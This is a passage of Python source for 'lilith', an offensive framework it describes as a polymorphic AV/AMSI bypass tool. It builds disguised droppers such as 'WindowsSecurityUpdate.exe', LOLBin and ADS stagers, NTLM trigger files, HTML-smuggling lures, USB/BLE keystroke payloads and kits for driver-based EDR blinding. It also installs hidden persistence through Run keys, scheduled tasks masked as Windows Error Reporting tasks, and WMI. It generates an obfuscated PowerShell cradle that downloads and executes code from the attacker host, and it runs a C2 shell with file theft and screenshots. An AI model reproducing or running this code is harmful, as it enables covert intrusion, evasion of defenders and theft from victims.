        wasm_exe   = getattr(args, "wasm_exe",   None) or "WindowsSecurityUpdate.exe"
        wasm_title = getattr(args, "wasm_title", None) or "Windows Security Update"
        build_wasm_dropper(
            runner_dat_path = runner_dat_path,
            runner_xor_key  = _read_runner_key(ws),
            out_dir         = ws.directory,
            lhost           = cfg.get("lhost", "10.10.14.1"),
            port            = cfg.get("http_port", 8443),
            url_prefix      = cfg.get("url_prefix", "/cdn/static/v3"),
            exe_name        = wasm_exe,
            page_title      = wasm_title,
        )
        did_something = True

    # ── NTLM trigger files ────────────────────────────────────────────────────
    if getattr(args, "ntlm_trigger", False):
        ntlm_out = getattr(args, "ntlm_out", None) or ws.path("ntlm_trigger")
        build_ntlm_triggers(lhost, ntlm_out)
        did_something = True

    # ── LOLBin stagers (no-PowerShell delivery) ──────────────────────────────
    if getattr(args, "lolbin", None):
        runner_dat_name = ws.get_enc_name("__runner_dat__")
        if not runner_dat_name or not os.path.exists(ws.path(runner_dat_name)):
            print("[!] Runner not built yet — run: lilith build --runner first")
            sys.exit(1)
        sc_enc_name = ws.get_enc_name("__runner_sc_c2__")
        sc_enc_path = ws.path(sc_enc_name) if sc_enc_name else None
        from builders.lolbin_stage import build_lolbin_stagers
        build_lolbin_stagers(
            mode            = args.lolbin,
            runner_dat_path = ws.path(runner_dat_name),
            runner_xor_key  = _read_runner_key(ws),
            sc_enc_path     = sc_enc_path,
            out_dir         = ws.directory,
            lhost           = cfg.get("lhost", "10.10.14.1"),
            port            = cfg.get("http_port", 8443),
            url_prefix      = cfg.get("url_prefix", "/cdn/static/v3"),
        )
        did_something = True

    # ── ADS staging ───────────────────────────────────────────────────────────
    if getattr(args, "ads", None) is not None:
        tname = args.ads or "__c2_agent__"
        enc_name = ws.get_enc_name(tname)
        if not enc_name or not os.path.exists(ws.path(enc_name)):
            hint = "lilith build --c2-stager" if tname == "__c2_agent__" else f"lilith build --tool {tname}"
            print(f"[!] No encoded artifact for '{tname}' — run: {hint}")
            sys.exit(1)
        from builders.ads_stage import build_ads_stager
        build_ads_stager(
            enc_filename = enc_name,
            lhost        = cfg.get("lhost", "10.10.14.1"),
            port         = cfg.get("http_port", 8443),
            url_prefix   = cfg.get("url_prefix", "/cdn/static/v3"),
            out_dir      = ws.directory,
            host_file    = getattr(args, "ads_host",   None),
            stream_name  = getattr(args, "ads_stream", None),
            user_agent   = cfg.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"),
        )
        did_something = True

    if not did_something:
        print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
        print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
        print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
        print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger, --ads [TOOL],")
        print("    --lolbin mshta|regsvr32|msbuild|all,")
        print("    or --wasm [--wasm-exe NAME] [--wasm-title TITLE]")


def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
    """
    Build the command string (sent to the agent as a task) that installs persistence.

    The agent executes this via cmd.exe /c <command>, so we generate a PowerShell
    invocation that sets up the persistence mechanism.  The payload re-downloads and
    executes the C2 agent stager, which re-establishes the C2 session on each trigger.

    Supported mechanisms:
      wmi      — WMI CommandLine Event Consumer (admin/SYSTEM; survives reboots)
      run      — HKCU Run key (user-level; fires at logon)
      schtask  — Scheduled task (user-level; fires at logon, highest privilege)

    All three store the stager download command base64-encoded (-enc) so no raw
    URL or PowerShell commands appear in registry/WMI values at rest.
    """
    import base64 as _b64
    import secrets as _sec

    scheme  = "https"
    lhost   = cfg.get("lhost", "10.10.14.1")
    port    = cfg.get("http_port", 8443)
    url_pfx = cfg.get("url_prefix", "/cdn/static/v3")

    # Find the C2 agent stager PS1
    stager_name = ws.alloc_stager_name("__c2_agent__")
    stager_url  = f"{scheme}://{lhost}:{port}{url_pfx}/{stager_name}"
    if not os.path.exists(ws.path(stager_name)):
        print(f"[!] C2 agent stager not found — run: lilith build --c2-stager first")
        return None

    # Compact persistence one-liner: XOR-decode URL, fetch via TcpClient+SslStream, execute.
    # Uses IO.StreamReader.ReadToEnd() to avoid the MemoryStream read loop — keeps the
    # base64 blob small (~1.5KB) while avoiding WinHTTP COM (flagged by Defender/CrowdStrike).
    # The stager URL is XOR-encoded so no plain IP/path appears in registry/WMI values.
    url_key = _sec.randbits(7) + 15  # 15-142 key range, avoids 0
    url_enc  = ",".join(str(ord(c) ^ url_key) for c in stager_url)
    compact_ps1 = (
        f"$k={url_key};"
        f"$u=([byte[]]@({url_enc})|%{{[char]($_ -bxor $k)}})-join'';"
        f"$h=[Uri]$u;"
        f"$t=New-Object Net.Sockets.TcpClient($h.Host,$h.Port);"
        f"$s=New-Object Net.Security.SslStream($t.GetStream(),$false,{{$true}});"
        f"$s.AuthenticateAsClient($h.Host);"
        f'$q=[Text.Encoding]::ASCII.GetBytes("GET "+$h.PathAndQuery+" HTTP/1.1`r`nHost: "+$h.Host+"`r`nConnection: close`r`n`r`n");'
        f"$s.Write($q,0,$q.Length);"
        f"$r=(New-Object IO.StreamReader($s,[Text.Encoding]::UTF8)).ReadToEnd();"
        r"[scriptblock]::Create(($r -split '\r\n\r\n',2)[1]).Invoke()"
    )
    enc_b64 = _b64.b64encode(compact_ps1.encode("utf-16-le")).decode()

    rand_name = "Msft" + _sec.token_hex(4).upper()
    ps_cmd    = f"powershell -nop -w hidden -ep bypass -enc {enc_b64}"

    if persist_type == "run":
        # HKCU Run key — fires at user logon, no admin required
        reg_val = ps_cmd.replace('"', '\\"')
        return (
            f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v {rand_name} /t REG_SZ /d "{reg_val}" /f'
        )

    elif persist_type == "schtask":
        # Scheduled task — fires at logon, survives session reconnects
        task_arg = f"-nop -w hidden -ep bypass -enc {enc_b64}"
        return (
            f'schtasks /create /tn "{rand_name}" /tr '
            f'"powershell {task_arg}" '
            f'/sc ONLOGON /ru "%USERDOMAIN%\\%USERNAME%" /rl HIGHEST /f'
        )

    elif persist_type == "wer":
        # Scheduled task hidden in the WER task folder — blends with legitimate WER
        # infrastructure. Runs as NT AUTHORITY\SYSTEM (requires admin/SYSTEM context).
        # Trigger: ONSTART fires at every boot before logon; harder to notice than
        # a custom task in the root folder.
        _wer_names = [
            "WerKernelReporting", "AppCrashUpload", "WerFaultSilent",
            "WatsonUploaderTask", "WerSubmitService", "DiagTrackerReporting",
        ]
        import random as _rnd
        wer_task = _rnd.choice(_wer_names)
        task_arg = f"-nop -w hidden -ep bypass -enc {enc_b64}"
        return (
            f'schtasks /create /tn "\\Microsoft\\Windows\\Windows Error Reporting\\{wer_task}" '
            f'/tr "powershell {task_arg}" '
            f'/sc ONSTART /ru "NT AUTHORITY\\SYSTEM" /f'
        )

    elif persist_type == "wmi":
        # Task 6 — WMI persistence with logon-based trigger instead of uptime.
        # Uptime-based (__InstanceModificationEvent on Win32_PerfFormattedData_PerfOS_System)
        # is one of the first queries IR teams run ("Invoke-WMISweep", SentinelOne WMI sweep).
        # Win32_ProcessStartTrace WHERE ProcessName='explorer.exe' fires on every
        # interactive logon (explorer starts per-session) and is significantly quieter.
        # Requires admin-level WMI subscription namespace.
        wmi_ps = ";".join([
            f"$fn='{rand_name}'",
            "$ns='root\\subscription'",
            # Logon trigger: fires when explorer.exe starts (per interactive logon session)
            "$flt=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments "
            "@{Name=$fn;QueryLanguage='WQL';"
            "Query=\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'\"}",
            f"$cns=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer "
            f"-Arguments @{{Name=$fn;CommandLineTemplate='{ps_cmd}'}}",
            "Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding "
            "-Arguments @{Filter=$flt;Consumer=$cns}",
        ])
        wmi_b64 = _b64.b64encode(wmi_ps.encode("utf-16-le")).decode()
        return f"powershell -nop -ep bypass -enc {wmi_b64}"

    return None


def cmd_serve(args, cfg, ws):
    from core.engage import EngagementDB
    from server.https_server import set_ui_token
    port      = args.port      or cfg.get("http_port",   8443)
    mgmt_port = args.mgmt_port or cfg.get("mgmt_port",   8444)
    db_path   = ws.path("engagement.db")
    db        = EngagementDB(db_path)
    set_engage_db(db)
    ui_tok = getattr(args, "ui_token", "") or cfg.get("ui_token", "")
    if ui_tok:
        set_ui_token(ui_tok)
        print(f"[+] UI auth       : enabled")
    else:
        print(f"[+] UI auth       : disabled (pass --ui-token to enable)")
    print(f"[+] Engagement DB : {db_path}")
    start_server(
        workspace       = ws.directory,
        lhost           = "0.0.0.0",
        port            = port,
        mgmt_port       = mgmt_port,
        callback_prefix = cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
    )


def cmd_c2(args, cfg, ws):
    import http.client, time as _time

    mgmt_port = cfg.get("mgmt_port", 8444)
    wait_secs = args.timeout if getattr(args, "timeout", None) else cfg.get("c2_timeout_s", 50)

    def _mgmt_get(path):
        try:
            c = http.client.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
            c.request("GET", path)
            r = c.getresponse()
            body = r.read()
            c.close()
            return r.status, body
        except Exception as e:
            return None, str(e).encode()

    def _mgmt_post(path, payload):
        try:
            body = json.dumps(payload).encode()
            c = http.client.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
            c.request("POST", path, body, {"Content-Type": "application/json"})
            r = c.getresponse()
            resp = r.read()
            c.close()
            return r.status, resp
        except Exception as e:
            return None, str(e).encode()

    def _mgmt_delete(path):
        try:
            c = http.client.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
            c.request("DELETE", path)
            r = c.getresponse()
            body = r.read()
            c.close()
            return r.status, body
        except Exception as e:
            return None, str(e).encode()

    def _push_and_wait(sid, cmd_str):
        """Push cmd_str as a task and wait for the result. Returns output string or None."""
        st, body = _mgmt_post(f"/mgmt/{sid}/task", {"cmd": cmd_str})
        if st is None:
            print(f"[!] Cannot reach management API: {body.decode()[:100]}")
            return None
        if st == 404:
            print(f"[!] Session {sid} not found")
            return None
        try:
            tid = json.loads(body)["task_id"]
        except Exception:
            print(f"[!] Unexpected response: {body.decode()[:200]}")
            return None
        print(f"[*] Task {tid} queued — waiting ({wait_secs}s)...")
        deadline = _time.time() + wait_secs
        while _time.time() < deadline:
            st2, body2 = _mgmt_get(f"/mgmt/{sid}/result/{tid}")
            if st2 == 200:
                try:
                    out = json.loads(body2)["output"]
                    return out if out else "[no output]"
                except Exception:
                    return body2.decode()
            _time.sleep(1)
        print(f"[!] Timeout (task {tid})")
        return None

    # ── --kill: forget a session (no --session required) ──────────────────────
    if getattr(args, "kill", None):
        st, body = _mgmt_delete(f"/mgmt/{args.kill}")
        if st is None:
            print(f"[!] Cannot reach management API on port {mgmt_port}")
            return
        if st == 404:
            print(f"[!] Session {args.kill} not found")
            return
        print(f"[+] Session {args.kill} killed")
        return

    # ── --list / no session: print session table ───────────────────────────────
    if args.list or not args.session:
        st, body = _mgmt_get("/mgmt/sessions")
        if st is None:
            print(f"[!] Cannot reach management API on port {mgmt_port} — is 'lilith serve' running?")
            return
        try:
            sessions = json.loads(body)
        except Exception:
            print(f"[!] Bad response: {body.decode()[:200]}")
            return
        if not sessions:
            print("[*] No active C2 sessions")
            return
        print(f"\n{'Session ID':<18} {'Host':<18} {'Pending':<8} {'Last seen':<10} {'Status'}")
        print("-" * 70)
        for s_id, info in sessions.items():
            status = "[stale]" if info.get("stale") else "[alive]"
            print(f"{s_id:<18} {info['host']:<18} {info['pending']:<8} {info['last_seen']:<10} {status}")
        print()
        return

    sid = args.session

    # ── --migrate [PROCESS]: ask agent to inject itself into another process ───
    if getattr(args, "migrate", None) is not None:
        target  = args.migrate or ""
        migrate_cmd = f"migrate {target}".strip()
        result  = _push_and_wait(sid, migrate_cmd)
        if result is not None:
            print(result)
            if "[+]" in result:
                print(f"\n[*] Old session {sid} is still alive until the process dies.")
                print(f"    Wait ~30s for the new session to appear, then: lilith c2 --list")
                print(f"    Kill this session when done: lilith c2 --kill {sid}")
        return

    # ── --persist TYPE: install persistence via the agent ─────────────────────
    if getattr(args, "persist", None):
        persist_cmd = _build_persist_cmd(args.persist, cfg, ws)
        if not persist_cmd:
            return
        print(f"[*] Installing {args.persist} persistence via session {sid}...")
        result = _push_and_wait(sid, persist_cmd)
        if result is not None:
            print(result)
        mech = {
            "run":     "HKCU Run key fires at next user logon",
            "schtask": "Scheduled task fires at next user logon",
            "wmi":     "WMI subscription fires 120s after next boot/resume",
            "wer":     "WER-masked SYSTEM task fires at every boot (requires admin)",
        }.get(args.persist, "")
        if mech:
            print(f"\n[*] {mech}")
            print(f"    Payload: downloads C2 agent stager → re-establishes session")
        return

    # ── --upload LOCAL REMOTE: stage file on C2 then push upload task ─────────
    if getattr(args, "upload", None):
        import base64 as _b64, threading as _threading
        local_path, remote_path = args.upload
        if not os.path.exists(local_path):
            print(f"[!] Local file not found: {local_path}")
            return
        lhost   = cfg.get("lhost", "10.10.14.1")
        port    = cfg.get("http_port", 8443)
        prefix  = cfg.get("url_prefix", "/cdn/static/v3")
        fname   = os.path.basename(local_path)
        staging_url = f"https://{lhost}:{port}{prefix}/{fname}"
        dest_ws = ws.path(fname)
        import shutil as _shutil
        _shutil.copy2(local_path, dest_ws)
        print(f"[*] Staged {local_path} → {dest_ws}")
        print(f"[*] Agent will fetch: {staging_url}")
        result = _push_and_wait(sid, f"upload {staging_url} {remote_path}")
        if result is not None:
            print(result)
        return

    # ── --download REMOTE [--out LOCAL]: pull file from target ────────────────
    if getattr(args, "download", None):
        import base64 as _b64
        remote_path = args.download
        out_path    = getattr(args, "out", None) or os.path.basename(remote_path)
        result = _push_and_wait(sid, f"download {remote_path}")
        if result is None:
            return
        if result.startswith("_BIN_B64:\n"):
            raw = _b64.b64decode(result[10:])
            with open(out_path, "wb") as _f:
                _f.write(raw)
            print(f"[+] Saved {len(raw):,} bytes → {out_path}")
        else:
            print(result)
        return

    # ── --screenshot [--out FILE]: capture desktop ─────────────────────────────
    if getattr(args, "screenshot", False):
        import base64 as _b64
        out_path = getattr(args, "out", None) or "screenshot.bmp"
        result = _push_and_wait(sid, "screenshot")
        if result is None:
            return
        if result.startswith("_BIN_B64:\n"):
            raw = _b64.b64decode(result[10:])
            with open(out_path, "wb") as _f:
                _f.write(raw)
            print(f"[+] Saved {len(raw):,} bytes → {out_path}")
        else:
            print(result)
        return

    # ── --cmd: one-shot command ────────────────────────────────────────────────
    if args.cmd:
        result = _push_and_wait(sid, args.cmd)
        if result is not None:
            print(result)
        return

    # ── Interactive REPL ───────────────────────────────────────────────────────
    print(f"[*] C2 shell → session {sid}")
    print(f"    Built-in: migrate [proc.exe]  |  !persist wmi|run|schtask  |  !kill  |  !timeout <sec>  |  !cleanup\n")
    while True:
        try:
            cmd_input = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd_input:
            continue
        if cmd_input.lower() in ("exit", "quit"):
            break

        # Local REPL meta-commands
        if cmd_input == "!kill":
            st_k, _ = _mgmt_delete(f"/mgmt/{sid}")
            if st_k == 200:
                print(f"[+] Session {sid} killed")
            else:
                print(f"[!] Kill failed (status {st_k})")
            break

        if cmd_input.startswith("!timeout "):
            try:
                wait_secs = int(cmd_input.split(None, 1)[1])
                print(f"[*] Timeout set to {wait_secs}s")
            except ValueError:
                print("[!] Usage: !timeout <seconds>")
            continue

        if cmd_input.startswith("!persist "):
            ptype = cmd_input.split(None, 1)[1].strip()
            if ptype not in ("wmi", "run", "schtask"):
                print("[!] Usage: !persist wmi|run|schtask")
                continue
            pcmd = _build_persist_cmd(ptype, cfg, ws)
            if not pcmd:
                continue
            result = _push_and_wait(sid, pcmd)
            if result is not None:
                print(result)
            continue

        if cmd_input == "!cleanup":
            runner_name = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
            clean_cmds  = (
                f'Remove-Item "$env:TEMP\\{runner_name}" -Force -EA SilentlyContinue; '
                f'Get-ChildItem $env:TEMP -Filter "wct*.exe" | Remove-Item -Force -EA SilentlyContinue; '
                f'"[+] cleanup done"'
            )
            result = _push_and_wait(sid, clean_cmds)
            if result is not None:
                print(result)
            continue

        # Regular command — agent handles migrate/pid builtins itself
        st, body = _mgmt_post(f"/mgmt/{sid}/task", {"cmd": cmd_input})
        if st is None:
            print(f"[!] {body.decode()[:100]}")
            continue
        if st == 404:
            print(f"[!] Session {sid} not found — agent may have disconnected")
            break
        try:
            tid = json.loads(body)["task_id"]
        except Exception:
            print(f"[!] {body.decode()[:200]}")
            continue

        deadline = _time.time() + wait_secs
        got = False
        while _time.time() < deadline:
            st2, body2 = _mgmt_get(f"/mgmt/{sid}/result/{tid}")
            if st2 == 200:
                try:
                    out = json.loads(body2)["output"]
                    print(out if out else "[no output]")
                except Exception:
                    print(body2.decode())
                got = True
                break
            _time.sleep(1)
        if not got:
            print(f"[!] Timeout (task {tid}) — use '!timeout <sec>' to increase the wait")


def cmd_network(args, cfg, ws):
    lhost = cfg.get("lhost", "10.10.14.1")

    if args.net_cmd == "captive":
        from network.captive import run_captive_portal

        iface = args.iface
        ssid  = args.ssid or "Corp_Guest"
        port  = args.cap_port or 80

        # Load lure HTML from workspace (built by --smuggle) or emit minimal page
        smuggle_out = ws.directory
        html_path   = os.path.join(smuggle_out, "index.html")
        if os.path.exists(html_path):
            with open(html_path, "r", encoding="utf-8") as f:
                html_lure = f.read()
            print(f"[*] Using lure: {html_path}")
        else:
            print("[!] No index.html found — run: lilith build --smuggle first")
            print("    Falling back to minimal redirect page")
            html_lure = (
                '<!DOCTYPE html><html><head><title>Network Login</title>'
                '<meta http-equiv="refresh" content="0;url=/portal"></head>'
                '<body><p>Please wait...</p></body></html>'
            )

        run_captive_portal(
            iface      = iface,
            ssid       = ssid,
            html_lure  = html_lure,
            output_dir = os.path.join(smuggle_out, "captive"),
            port       = port,
        )

    elif args.net_cmd == "wpad":
        from network.wpad import run_wpad

        pac_port   = args.pac_port   or 80
        proxy_port = args.proxy_port or 8080

        # Load inject.js from workspace (built by --smuggle) or abort
        smuggle_out = ws.directory
        inject_js   = load_inject_js(smuggle_out)
        if not inject_js:
            print("[!] inject.js not found — run: lilith build --smuggle first")
            sys.exit(1)
        print(f"[*] Using inject.js from {smuggle_out}")

        run_wpad(
            lhost      = lhost,
            inject_js  = inject_js,
            pac_port   = pac_port,
            proxy_port = proxy_port,
        )

    elif args.net_cmd == "webdav":
        from network.webdav import run_webdav

        lnk_path = args.lnk_path
        if not lnk_path:
            # auto-detect LNK from workspace (built by --smuggle)
            lnk_path = os.path.join(ws.directory, "payload.lnk")
        if not os.path.exists(lnk_path):
            print(f"[!] LNK not found: {lnk_path}")
            print(f"    Build one first: lilith build --smuggle")
            sys.exit(1)

        run_webdav(
            lhost    = lhost,
            lnk_path = lnk_path,
            port     = args.webdav_port or cfg.get("webdav_port", 8080),
            lnk_name = args.lnk_name or "Critical Update",
        )

    else:
        print("[!] Specify a network subcommand: captive | wpad | webdav")
        sys.exit(1)


def cmd_engage(args, cfg, ws):
    from core.engage import EngagementDB
    db_path = ws.path("engagement.db")
    if not os.path.exists(db_path):
        print(f"[!] No engagement database found at {db_path}")
        print(f"    Start 'lilith serve' first — the DB is created automatically on first run.")
        return
    db = EngagementDB(db_path)

    if getattr(args, "tag", None):
        sid, label = args.tag[0], args.tag[1]
        note = args.note_text if getattr(args, "note_text", None) and not getattr(args, "note_task", None) else None
        ok = db.tag_session(sid, label, note)
        print(f"[+] Tagged session {sid} → '{label}'" if ok else f"[!] Session {sid} not found in DB")
        return

    if getattr(args, "add_note", None):
        tid, text = args.add_note[0], args.add_note[1]
        ok = db.add_note(tid, text)
        print(f"[+] Note added to task {tid}" if ok else f"[!] Task {tid} not found in DB")
        return

    if getattr(args, "export", None):
        fmt = args.export.lower()
        out_path = getattr(args, "out", None)
        if fmt == "json":
            content = json.dumps(db.export_json(), indent=2)
            ext = ".json"
        elif fmt in ("md", "markdown"):
            content = db.export_markdown()
            ext = ".md"
        else:
            print(f"[!] Unknown export format '{fmt}' — use: json | md")
            return
        if out_path:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"[+] Exported ({fmt}) → {out_path}")
        else:
            default = f"engagement_report{ext}"
            with open(default, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"[+] Exported ({fmt}) → {default}")
        return

    # Default: print summary tables
    sessions = db.get_sessions()
    if not sessions:
        print("[*] No sessions recorded yet.")
        return

    sid_filter = getattr(args, "session", None)

    if getattr(args, "list_tasks", False):
        tasks = db.get_tasks(session_id=sid_filter)
        if not tasks:
            print("[*] No tasks recorded.")
            return
        print(f"\n{'Task ID':<18} {'Session':<18} {'Time':<20} {'ATT&CK':<15} {'Creds':<6}  Command")
        print("─" * 110)
        for t in tasks:
            attack = t.get("technique_id") or "—"
            cred   = "YES" if t.get("has_creds") else "—"
            time_  = (t.get("dispatched_at") or "")
            cmd_s  = (t.get("command") or "")[:60]
            print(f"{t['id']:<18} {t['session_id']:<18} {time_:<20} {attack:<15} {cred:<6}  {cmd_s}")
        print()
        return

    # Default: session list
    print(f"\n{'Session ID':<18} {'Host':<16} {'Registered':<20} {'Label':<20} {'Tasks':<6} {'Cred tasks'}")
    print("─" * 100)
    for s in sessions:
        label = s.get("label") or "—"
        print(f"{s['id']:<18} {s['host']:<16} {s['registered_at']:<20} {label:<20} {s.get('task_count',0):<6} {s.get('cred_tasks',0)}")
    print()

    creds = db.get_cred_results()
    if creds:
        print(f"[!] {len(creds)} task(s) with credential captures — run: lilith engage --export md")


def cmd_xdr(args, cfg, ws):
    from builders.cortex_xdr import parse_and_report
    parse_and_report(args.db_dir)


def cmd_list(args, cfg, ws):
    list_tools()


def cmd_check(args, cfg, ws):
    print("[*] Dependency check\n")
    deps = {
        "x86_64-w64-mingw32-gcc": "gcc-mingw-w64",
        "donut":                   "pip install donut-shellcode",
        "openssl":                 "openssl (pre-installed)",
        "python3":                 "python3",
    }
    all_ok = True
    for bin_, pkg in deps.items():
        found  = shutil.which(bin_)
        status = "✓" if found else "✗"
        note   = found or f"missing — {pkg}"
        print(f"  [{status}] {bin_:<30} {note}")
        if not found:
            all_ok = False
    print()
    if all_ok:
        print("[+] All dependencies found")
    else:
        print("[!] Missing dependencies above")


# ── banner ────────────────────────────────────────────────────────────────────

def _banner() -> None:
    tty = sys.stdout.isatty()
    P   = "\033[1;35m"  if tty else ""   # bold magenta  — the art
    D   = "\033[2;37m"  if tty else ""   # dim white     — the words
    R   = "\033[0m"     if tty else ""

    print(f"""
{P} _       ___   _       ___   _____  _  _  {R}
{P}) |     )_ _( ) |     )_ _( )__ __() () ({R}
{P}| (__   _| |_ | (__   _| |_   | |  | -- |{R}
{P})____( )_____()____( )_____(  )_(  )_()_({R}

{D}  She existed before the first rule was written.{R}
{D}  She will remain long after the last one is broken.{R}
""")


def cmd_patch(args, cfg, ws):
    from builders.patcher import backdoor_pe, backdoor_pe_from_stager

    if args.sc:
        # pre-built shellcode provided — skip donut
        with open(args.sc, "rb") as f:
            shellcode = f.read()
        backdoor_pe(args.target, shellcode, args.output, args.section)
    else:
        # derive stager URL from engagement config (same logic as cmd_build)
        lhost     = cfg.get("lhost", "127.0.0.1")
        http_port = cfg.get("http_port", 8443)
        base_url  = f"https://{lhost}:{http_port}"
        stager_url = f"{base_url}/cdn/static/v3/stage.ps1"
        print(f"[*] Stager URL : {stager_url}")
        backdoor_pe_from_stager(args.target, stager_url, args.output, args.section)


# ── CLI ────────────────────────────────────────────────────────────────────────

def main():
    _banner()
    parser = argparse.ArgumentParser(
        prog="lilith",
        description="polymorphic AV/AMSI bypass framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="command", metavar="command")

    sub.add_parser("init",  help="Create engagement.yaml from template")
    sub.add_parser("list",  help="List available tools (✓ = binary found on disk)")
    sub.add_parser("check", help="Verify build dependencies")

    build_p = sub.add_parser("build", help="Build runner / encode tools / generate stagers")
    build_p.add_argument("--runner",      action="store_true", help="Build polymorphic C runner")
    build_p.add_argument("--tool",        metavar="NAME",      help="Encode single tool → .enc")
    build_p.add_argument("--tools",       action="store_true", help="Encode all tools in engagement.yaml")
    build_p.add_argument("--stager",      metavar="NAME",      help="Generate PS1 stager for one tool")
    build_p.add_argument("--stagers",     action="store_true", help="Generate stagers for all encoded tools")
    build_p.add_argument("--all",         action="store_true", help="Full pipeline: runner + tools + stagers")
    build_p.add_argument("--escalate",    metavar="POTATO",
                         help="Escalation chain potato tool: GodPotato|PrintSpoofer|JuicyPotato|RoguePotato")
    build_p.add_argument("--system-tool", metavar="NAME",
                         help="Tool to self-inject as SYSTEM after escalation (use with --escalate)")
    build_p.add_argument("--shellcode",   metavar="FILE",
                         help="Pack raw shellcode .bin into .enc + generate stager (MSF/Sliver/custom)")
    build_p.add_argument("--name",        metavar="NAME",
                         help="Output name for --shellcode (e.g. revshell)")
    build_p.add_argument("--args",        metavar="ARGS",
                         help="Override tool params for --tool (e.g. --args \"find /ca /enrolleeSuppliesSubject\")")
    build_p.add_argument("--c2-stager",   action="store_true", dest="c2_stager",
                         help="Generate fileless C2 agent stager (injects runner shellcode, no PE on disk)")
    build_p.add_argument("--byovd",        action="store_true",
                         help="Build BYOVD kit: GUI exe + fileless shellcode .enc (ETW-TI, OB callbacks, PPL, DSE)")
    build_p.add_argument("--byovd-driver", metavar="PATH", dest="byovd_driver",
                         default=r"C:\Windows\Temp\driver.sys",
                         help=r"Driver path on target baked into byovd.enc (default: C:\Windows\Temp\driver.sys)")
    build_p.add_argument("--byovd-ops",    metavar="OPS",  dest="byovd_ops",
                         default="--etwti --remove-callbacks --remove-ob-callbacks",
                         help="Operations to bake into byovd.enc (default: full Falcon blinding)")
    build_p.add_argument("--usb",           metavar="TOOL",  dest="usb",
                         help="Generate USB HID keystroke payloads for a built stager (tool name)")
    build_p.add_argument("--usb-device",    metavar="TYPE",  dest="usb_device", default="all",
                         choices=list(USB_DEVICES) + ["all"],
                         help="HID device type: duck | pico | digispark | teembed | all  (default: all)")
    build_p.add_argument("--usb-out",       metavar="DIR",   dest="usb_out",    default=None,
                         help="Output directory for payload files (default: <workspace>/usb/)")
    build_p.add_argument("--usb-boot-delay", metavar="MS",   dest="usb_boot_delay", type=int, default=2000,
                         help="USB enumeration + HID driver wait in ms (default: 2000, increase for slow targets)")
    build_p.add_argument("--ble",            metavar="TOOL",  dest="ble", nargs="?", const="__c2_agent__",
                         help="Generate BLE HID sketch for M5StickC Plus2 (tool name, or bare --ble for C2 agent stager)")
    build_p.add_argument("--ble-device",     metavar="TYPE",  dest="ble_device", default="m5stick",
                         choices=list(BLE_DEVICES) + ["all"],
                         help="BLE device type: m5stick | bruce | all  (default: m5stick)")
    build_p.add_argument("--ble-out",        metavar="DIR",   dest="ble_out",    default=None,
                         help="Output directory for BLE sketch folder (default: <workspace>/ble/)")
    build_p.add_argument("--ble-name",       metavar="NAME",  dest="ble_name",   default="Apple Wireless Keyboard",
                         help="BLE device name shown on target pairing dialog (default: 'Apple Wireless Keyboard')")
    build_p.add_argument("--nfc",          action="store_true", dest="nfc",
                         help="Generate NFC tag NDEF binary for mobile delivery (default URL: https://lhost:port/wasm_loader.html)")
    build_p.add_argument("--nfc-url",      metavar="URL",   dest="nfc_url",  default=None,
                         help="Override NFC tag URL (default: Android APK lure page)")
    build_p.add_argument("--nfc-out",      metavar="DIR",   dest="nfc_out",  default=None,
                         help="Output directory for NFC tag files (default: <workspace>/nfc/)")
    build_p.add_argument("--smuggle",        metavar="TOOL",  dest="smuggle", nargs="?", const="__c2_agent__",
                         help="HTML smuggling → ISO → LNK (tool name, or bare --smuggle for C2 agent stager)")
    build_p.add_argument("--smuggle-lure",   metavar="THEME", dest="smuggle_lure", default="update",
                         choices=list(SMUGGLE_LURES),
                         help="Lure theme: " + " | ".join(SMUGGLE_LURES) + "  (default: update)")
    build_p.add_argument("--smuggle-lnk",    metavar="NAME",  dest="smuggle_lnk",  default="Windows Security Update",
                         help="LNK display name inside ISO (no extension — .lnk hidden by Explorer)")
    build_p.add_argument("--smuggle-iso",    metavar="NAME",  dest="smuggle_iso",  default="WindowsSecurityUpdate.iso",
                         help="ISO filename in browser download bar (default: WindowsSecurityUpdate.iso)")
    build_p.add_argument("--smuggle-out",    metavar="DIR",   dest="smuggle_out",  default=None,
                         help="Output directory (default: workspace root)")
    build_p.add_argument("--wasm",           action="store_true",
                         help="Wrap runner PE in a WebAssembly module + HTML browser dropper for AV evasion")
    build_p.add_argument("--wasm-exe",      metavar="NAME",  dest="wasm_exe",   default=None,
                         help="Filename for the downloaded .exe (default: WindowsSecurityUpdate.exe)")
    build_p.add_argument("--wasm-title",    metavar="TITLE", dest="wasm_title", default=None,
                         help="HTML lure page title (default: Windows Security Update)")
    build_p.add_argument("--ntlm-trigger",  action="store_true", dest="ntlm_trigger",
                         help="Generate .url/.scf/.searchConnector NTLM trigger files (auto-auth on folder browse)")
    build_p.add_argument("--ntlm-out",      metavar="DIR",   dest="ntlm_out",     default=None,
                         help="Output directory for NTLM trigger files (default: <workspace>/ntlm_trigger/)")
    build_p.add_argument("--lolbin",        metavar="MODE",  dest="lolbin",
                         choices=["mshta", "regsvr32", "msbuild", "all"],
                         help="No-PowerShell stager: mshta | regsvr32 | msbuild | all")
    build_p.add_argument("--ads",           metavar="TOOL",  dest="ads", nargs="?", const="__c2_agent__",
                         help="Stage payload in NTFS ADS + generate offline loader (default: C2 agent)")
